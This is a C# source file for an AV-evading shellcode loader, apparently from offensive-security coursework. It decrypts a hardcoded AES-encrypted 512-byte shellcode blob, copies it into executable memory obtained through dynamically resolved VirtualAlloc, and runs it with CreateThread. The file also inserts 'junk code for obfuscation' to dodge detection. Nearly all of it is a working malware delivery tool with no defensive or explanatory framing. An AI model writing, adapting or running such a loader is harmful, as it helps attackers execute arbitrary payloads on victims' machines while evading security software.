using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Linq;

namespace StayAwhile
{
    class AndListen
    {
        private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate UInt32 WaitForSingleObjectDelegate(IntPtr hHandle, UInt32 dwMilliseconds);

        private static T GetDelegateForFunction<T>(string dllName, string functionName) where T : Delegate
        {
            IntPtr hModule = LoadLibrary(dllName);
            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to load DLL: {dllName}");
                return null;
            }

            IntPtr pFunction = GetProcAddress(hModule, functionName);
            if (pFunction == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to get function address for: {functionName}");
                return null;
            }

            return (T)Marshal.GetDelegateForFunctionPointer(pFunction, typeof(T));
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            // New key bytes
            byte[] Says = new byte[16] {
                0xd5, 0x78, 0x4d, 0xb8, 0xf8, 0x53, 0xd7, 0x71, 0xa7, 0xc6, 0xef, 0x50, 0x2b, 0x1a, 0xd2, 0x22 };

            // New IV bytes
            byte[] Try = new byte[16] {
                0x08, 0x54, 0x25, 0x72, 0xd5, 0x22, 0xdf, 0x2f, 0x6a, 0x91, 0xd0, 0xa4, 0x57, 0x72, 0xc3, 0xc8 };

            // AES 128-bit encrypted shellcode
            byte[] Offsec = new byte[512] {
            0x8f, 0x81, 0x6e, 0x88, 0x69, 0x78, 0x17, 0xb1, 0xae, 0xdd, 0x78, 0xb6, 0x8f, 0x94, 0x3e,
            0x5a, 0xbd, 0x01, 0x9b, 0xcc, 0x64, 0x35, 0x7d, 0xbf, 0x36, 0xbb, 0x84, 0x40, 0xeb, 0x45,
            0x77, 0x3a, 0x3a, 0x57, 0xa1, 0x0f, 0x96, 0x58, 0x48, 0xa0, 0xc4, 0xeb, 0xec, 0x74, 0xf2,
            0x48, 0x3d, 0x1b, 0x14, 0x49, 0x81, 0x5a, 0xf5, 0x25, 0xe3, 0x63, 0x1b, 0xde, 0x5d, 0x49,
            0x98, 0x46, 0xf7, 0x14, 0x8b, 0x18, 0x83, 0x11, 0x11, 0xe4, 0x95, 0x6f, 0x18, 0xd5, 0x8e,
            0x81, 0x12, 0x67, 0x15, 0x3d, 0xdb, 0x1c, 0x78, 0x6d, 0x74, 0x48, 0x92, 0x92, 0x0f, 0x95,
            0x3e, 0xc3, 0x4d, 0x78, 0x13, 0x19, 0xc8, 0x39, 0xdc, 0x65, 0xb4, 0x44, 0x16, 0x92, 0xe4,
            0x1c, 0x78, 0xd1, 0xad, 0x37, 0x78, 0xa7, 0x3b, 0x11, 0x1a, 0xe0, 0x16, 0x97, 0x3e, 0x0e,
            0x2d, 0xbe, 0x74, 0x16, 0x84, 0x8a, 0x47, 0x9d, 0xaf, 0x43, 0x88, 0x88, 0xdc, 0x46, 0xf6,
            0xe9, 0x72, 0x63, 0xe2, 0xad, 0xab, 0xbc, 0x49, 0x92, 0xa4, 0x87, 0xa4, 0x55, 0x3d, 0x67,
            0xac, 0x1a, 0xd2, 0x3b, 0x06, 0xb6, 0xaa, 0x97, 0xaa, 0xd4, 0x09, 0x25, 0x04, 0x82, 0x1f,
            0x3d, 0xc4, 0x95, 0xbe, 0x67, 0xfd, 0xc3, 0x98, 0xc0, 0x0e, 0x3b, 0xad, 0xa4, 0x9d, 0x2c,
            0x93, 0x72, 0x81, 0x71, 0x06, 0x33, 0xf5, 0x56, 0x0b, 0x86, 0xa7, 0x6e, 0x26, 0x91, 0xf8,
            0x29, 0x1f, 0x24, 0xfd, 0xf2, 0xa0, 0xfa, 0xa9, 0x23, 0x85, 0x1d, 0xc9, 0x9d, 0xfb, 0xfb,
            0x16, 0xc1, 0x1e, 0x1f, 0x20, 0xa2, 0xbd, 0xfe, 0xb0, 0xa9, 0xf2, 0x2f, 0x9f, 0x71, 0xc7,
            0xd3, 0xca, 0x2e, 0xd0, 0x50, 0x78, 0xa7, 0x35, 0x5d, 0x0d, 0x12, 0x27, 0x6b, 0x25, 0x83,
            0xf9, 0xe0, 0xb1, 0x93, 0xd7, 0x78, 0x6c, 0x37, 0x6b, 0xaa, 0xf7, 0x6c, 0x2e, 0xd3, 0x2f,
            0x0d, 0x70, 0xd0, 0xe6, 0x60, 0x0c, 0xd4, 0x27, 0x17, 0x3e, 0xd0, 0xd5, 0xb9, 0xfd, 0xd1,
            0x91, 0x9e, 0xdc, 0x31, 0x84, 0x88, 0x78, 0x1b, 0x76, 0xb5, 0x34, 0x21, 0xd4, 0x20, 0x44,
            0x0f, 0xfa, 0x63, 0xef, 0xdc, 0xd8, 0x42, 0xd3, 0xdf, 0x0f, 0x45, 0x54, 0xf7, 0xc1, 0x0d,
            0x44, 0x77, 0xec, 0x67, 0xb4, 0xc1, 0xb8, 0x47, 0xe3, 0xaa, 0x2b, 0xfa, 0x95, 0x73, 0x1c,
            0xaf, 0x8d, 0x4d, 0x9d, 0x43, 0xa9, 0x59, 0xf7, 0x2b, 0xfa, 0xec, 0xe1, 0x9e, 0x4a, 0x32,
            0x0f, 0x4d, 0x99, 0xd9, 0x79, 0x92, 0x71, 0xc4, 0xdf, 0x8f, 0x20, 0x64, 0x7a, 0x15, 0xf7,
            0x7c, 0xe1, 0x4f, 0x5f, 0xe2, 0xf3, 0x2d, 0xb8, 0xd4, 0x6e, 0xfb, 0xcb, 0x84, 0x7f, 0xa1,
            0x8a, 0x4a, 0x28, 0x08, 0x59, 0x23, 0x2d, 0xaf, 0xa2, 0x18, 0x67, 0x9d, 0x29, 0x95, 0x05,
            0xba, 0xb8, 0x90, 0xc6, 0xe6, 0x1f, 0xff, 0x3b, 0xfb, 0x5f, 0x81, 0xff, 0xe3, 0xfe, 0x6b,
            0x55, 0x54, 0x2d, 0xa7, 0xf6, 0x28, 0x7c, 0x81, 0xbf, 0x4a, 0xd3, 0x8d, 0xb1, 0x45, 0xe6,
            0xb1, 0xbc, 0x35, 0x1f, 0xc5, 0xb9, 0x3d, 0x08, 0x23, 0x31, 0x32, 0xd0, 0x24, 0x0b, 0xf2,
            0x1a, 0x65, 0xe5, 0x9d, 0x58, 0xd2, 0xf9, 0x13, 0x96, 0x53, 0x94, 0x14, 0x74, 0xd5, 0xbe,
            0x12, 0x3f, 0x5a, 0x4d, 0xac, 0x5b, 0xfe, 0x3c, 0x50, 0x47, 0x77, 0x2b, 0xca, 0x3c, 0x4b,
            0xbc, 0x2e, 0xaa, 0x91, 0xe8, 0xaf, 0xfa, 0xfb, 0x46, 0x08, 0x07, 0xaf, 0xf5, 0xb8, 0x96,
            0x0c, 0x45, 0xfb, 0x67, 0x71, 0x11, 0x66, 0x70, 0x9c, 0x85, 0x13, 0x7f, 0x80, 0x32, 0xdc,
            0xe8, 0x36, 0x55, 0x09, 0xa8, 0x79, 0xe8, 0x3f, 0x0a, 0x07, 0x06, 0x70, 0x5c, 0xd2, 0xd2,
            0x46, 0xaf, 0x1f, 0x5e, 0xcb, 0x8c, 0x0b, 0x0d, 0x83, 0xf3, 0x11, 0x13, 0x2a, 0x7a, 0x10,
            0xe5, 0x0d };

            // Junk code for obfuscation
            int junk = 0;
            for (int i = 0; i < 1002; i++)
            {
                junk += i;
            }

            var crypto = new AndListen();
            byte[] Harder = crypto.Decrypt(Offsec, Says, Try);
            int size = Harder.Length;

            // More junk code for obfuscation
            for (int i = 0; i < 1001; i++)
            {
                junk -= i;
            }

            var VirtualAlloc = GetDelegateForFunction<VirtualAllocDelegate>("kernel32.dll", "VirtualAlloc");
            if (VirtualAlloc == null) return;

            var CreateThread = GetDelegateForFunction<CreateThreadDelegate>("kernel32.dll", "CreateThread");
            if (CreateThread == null) return;

            var WaitForSingleObject = GetDelegateForFunction<WaitForSingleObjectDelegate>("kernel32.dll", "WaitForSingleObject");
            if (WaitForSingleObject == null) return;

            IntPtr va = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(Harder, 0, va, size);
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
